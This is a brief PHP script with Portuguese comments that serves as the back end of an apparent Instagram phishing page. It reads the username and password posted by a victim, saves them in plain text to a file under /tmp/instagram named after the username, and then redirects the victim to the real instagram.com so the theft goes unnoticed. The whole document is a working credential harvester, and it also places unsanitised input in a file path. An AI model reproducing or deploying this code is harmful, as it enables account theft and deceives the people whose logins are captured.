<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    // cria arquivo no servidor
    $arquivo = fopen('/tmp/instagram/account_'. $username .'.txt','w');
    $texto = "Usuario: ". $username ."\r\nSenha: ". $password ."\r\n";
    fwrite($arquivo, $texto);
    fclose($arquivo);

    header("location: https://instagram.com");
?>